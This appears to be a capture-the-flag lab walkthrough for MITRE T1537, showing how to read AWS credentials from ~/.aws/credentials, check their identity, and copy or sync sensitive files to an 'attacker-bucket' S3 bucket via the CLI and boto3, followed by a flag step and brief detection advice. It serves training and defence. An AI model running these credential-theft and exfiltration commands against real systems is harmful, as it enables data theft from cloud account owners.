# T1537 – Transfer Data to Cloud Account | Solution Walkthrough
**Difficulty:** Hard | **OS:** Linux | **MITRE:** T1537

## Step 1 – Find Cloud Credentials
```bash
cat ~/.aws/credentials
# aws_access_key_id = AKIAIOSFODNN7EXAMPLE
# aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# Common locations: ~/.aws/credentials, ~/.config/gcloud/, env vars, metadata service
```

## Step 2 – Validate & Identify Who the Keys Belong To
```bash
# Check identity of AWS keys:
aws sts get-caller-identity
# Returns: Account, UserId, ARN — reveals privilege level
aws s3 ls  # list accessible buckets
```

## Step 3 – Transfer Data to Attacker's Cloud Account
```bash
# Method 1: Copy single file:
aws s3 cp /opt/sensitive-data/corp_secrets.txt s3://attacker-bucket/corp_secrets.txt

# Method 2: Sync entire directory:
aws s3 sync /opt/sensitive-data/ s3://attacker-bucket/corp-loot/

# Method 3: Presigned URL (time-limited, harder to trace):
aws s3 presign s3://victim-bucket/file.txt --expires-in 3600
# Anyone with the URL can download for 1 hour

# Method 4: Via Python boto3:
import boto3
s3 = boto3.client('s3')
s3.upload_file('/opt/sensitive-data/corp_secrets.txt', 'attacker-bucket', 'stolen.txt')
```

## Step 4 – Run Demo & Retrieve Flag
```bash
python3 /opt/cloud_transfer_demo.py /opt/sensitive-data/corp_secrets.txt
cat /opt/sensitive-data/corp_secrets.txt | head -1
# HACKTIFY{CLOUD_ACCOUNT_TRANSFER_<hash>}
```

## Detection
- **CloudTrail** logs: S3:PutObject from unusual sources/IPs
- Alert on `aws s3 cp` / `sync` to external buckets
- Monitor AWS metadata service calls (SSRF → credential theft)
- Rotate credentials and use IAM roles instead of long-term keys
